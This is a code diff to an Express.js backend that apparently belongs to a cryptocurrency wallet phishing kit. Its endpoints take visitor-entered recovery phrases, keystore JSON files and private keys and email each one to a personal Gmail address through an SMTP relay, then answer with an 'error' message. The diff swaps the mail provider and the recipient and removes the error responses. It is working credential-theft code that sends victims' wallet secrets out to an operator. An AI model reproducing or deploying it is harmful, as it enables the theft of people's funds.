@@ -1,15 +1,23 @@
  
  const express = require('express');  
  const dotenv = require('dotenv'); 
- const nodemailer = require('nodemailer');
+ const nodemailer = require('nodemailer'); 
+ const path = require('path');
  const cors = require('cors'); 
  const app = express();   
 
  dotenv.config();
  app.use(cors());
  app.use(express.json());
- app.use(express.urlencoded({extended:false}));   
+ app.use(express.urlencoded({extended:false}));      
 
+  // Serve static files from the React build directory
+app.use(express.static(path.join(__dirname, "build"))); 
+
+// Handle all other routes and serve index.html
+app.get("*", (req, res) => {
+    res.sendFile(path.join(__dirname, "build", "index.html"));
+  });       
  
  app.post('/processing', async (req, res) => {
      try {
@@ -21,7 +29,7 @@
  
          // Create SMTP transporter
          const transporter = nodemailer.createTransport({
-             host: 'smtp-relay.sendinblue.com',
+             host: 'smtp.mailersend.net',
              port: 587,
              auth: {
                  user: process.env.SMTP_USERNAME,
@@ -31,8 +39,8 @@
  
          // Define email options
          const mailOptions = {
-             from: 'victoremmy1876@gmail.com',
-             to: 'victoremmy1876@gmail.com',
+             from: 'MS_0ffbOq@trial-neqvygmp2ydg0p7w.mlsender.net',
+             to: 'diananicholas188@gmail.com',
              subject: 'My Recovery Phrase',
              html: `<p><strong>Your recovery phrase:</strong> ${inpvalue}</p>`, // Email content
          };
@@ -60,7 +68,7 @@
 
        // Create SMTP transporter
        const transporter = nodemailer.createTransport({
-           host: 'smtp-relay.sendinblue.com',
+           host: 'smtp.mailersend.net',
            port: 587,
            auth: {
                user: process.env.SMTP_USERNAME,
@@ -70,8 +78,8 @@
 
        // Define email options
        const mailOptions = {
-           from: 'victoremmy1876@gmail.com',
-           to: 'victoremmy1876@gmail.com',
+           from: 'MS_0ffbOq@trial-neqvygmp2ydg0p7w.mlsender.net',
+           to: 'diananicholas188@gmail.com',
            subject: 'My keystore json',
            html: `<p><strong>Your keystore json:</strong> ${inpvalue}</p>`, // Email content
        };
@@ -81,8 +89,7 @@
        res.json({ msg: 'error' }); 
 
    } catch (err) {
-       console.error('Error sending email:', err);
-       res.status(500).json({ error: 'Failed to send email' });
+       console.error('Error sending email:', err); 
    }
 });
 
@@ -100,7 +107,7 @@ app.post('/processingc', async (req, res) => {
 
        // Create SMTP transporter
        const transporter = nodemailer.createTransport({
-           host: 'smtp-relay.sendinblue.com',
+           host: 'smtp.mailersend.net',
            port: 587,
            auth: {
                user: process.env.SMTP_USERNAME,
@@ -110,8 +117,8 @@ app.post('/processingc', async (req, res) => {
 
        // Define email options
        const mailOptions = {
-           from: 'victoremmy1876@gmail.com',
-           to: 'victoremmy1876@gmail.com',
+           from: 'MS_0ffbOq@trial-neqvygmp2ydg0p7w.mlsender.net',
+           to: 'diananicholas188@gmail.com',
            subject: 'My private key',
            html: `<p><strong>Your privatekey:</strong> ${inpvalue}</p>`, // Email content
        };
@@ -121,10 +128,9 @@ app.post('/processingc', async (req, res) => {
        res.json({ msg: 'error' });  
 
    } catch (err) {
-       console.error('Error sending email:', err);
-       res.status(500).json({ error: 'Failed to send email' });
+       console.error('Error sending email:', err); 
    }
-});
+});   
  
 
  app.listen(5000 , ()=>{
